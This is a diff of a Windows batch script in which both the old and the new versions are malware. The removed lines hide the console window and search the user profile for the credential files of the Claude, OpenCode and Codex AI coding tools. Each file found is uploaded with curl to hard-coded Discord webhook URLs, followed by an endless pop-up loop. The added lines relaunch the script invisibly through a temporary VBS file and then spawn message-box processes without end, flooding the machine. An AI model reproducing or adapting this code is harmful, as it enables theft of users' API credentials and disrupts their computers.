@@ -1,29 +1,14 @@
 @echo off
-powershell -command "& {Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Win { [DllImport(\"user32.dll\")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags); [DllImport(\"kernel32.dll\")] public static extern IntPtr GetConsoleWindow(); }'; [void][Win]::SetWindowPos([Win]::GetConsoleWindow(), [IntPtr]::Zero, 1, 1, 1, 1, 0x0040)}"
-set "ClaudeE=%userprofile%\.claude\credentials.json"
-set "ClaudeEE=%userprofile%\.claude\.credentials.json"
-set "OpenCodeE=%userprofile%\.local\share\opencode\auth.json"
-set "CodexE=%userprofile%\.codex\auth.json"
-set "OpenCode=https://discord.com/api/webhooks/1509347871974101152/KzKcfHkJXnUaZFDIIk0lceB7Rys8Hvj6V4V-38LUlhaMvX4IkIXCr2MfW-nqyMjBSh0K"
-set "Claude=https://discord.com/api/webhooks/1509356918148169920/Gl98LVlee9vJ6mM6ZOgfHFnen8ILV9mZs24bgvhSdQ2TsVqBlLKuSIwVqabMA3ztWcle"
-set "Codex=https://discord.com/api/webhooks/1509361226583638026/kUQ84E8sysn6X25dpr70TX7y7wOaCIPHMOxJaz6jPz0DEYFA5s6qVo5fVGaL_NhxATJt"
-if exist "%OpenCodeE%" (
-    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"que elegancia\"}" %OpenCode%
-    curl -F "file=@%OpenCodeE%" %OpenCode%
-)
-if exist "%ClaudeEE%" (
-    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"chinche!\"}" %Claude%
-    curl -F "file=@%ClaudeEE%" %Claude%
-)
-if exist "%ClaudeE%" (
-    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"huy sona\"}" %Claude%
-    curl -F "file=@%ClaudeE%" %Claude%
-)
-if exist "%CodexE%" (
-    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"huy sona\"}" %Codex%
-    curl -F "file=@%CodexE%" %Codex%
-)
-:losad
-msg * Estamos en guerra pa.
-goto losad
+title GatoFlash
+if "%1"=="hide" goto :run
+set "vbs_hide=%temp%\hide_run.vbs"
+echo CreateObject("Wscript.Shell").Run chr(34) ^& "%~f0" ^& chr(34) ^& " hide", 0, False > "%vbs_hide%"
+wscript "%vbs_hide%"
+del "%vbs_hide%"
+exit
+:run
+echo x=msgbox("Un gatito ha tomado el control.", 64, "¡Miau! NI-") > "%temp%\gatito_msg.vbs"
+:loop
+start wscript "%temp%\gatito_msg.vbs"
+goto loop
 exit
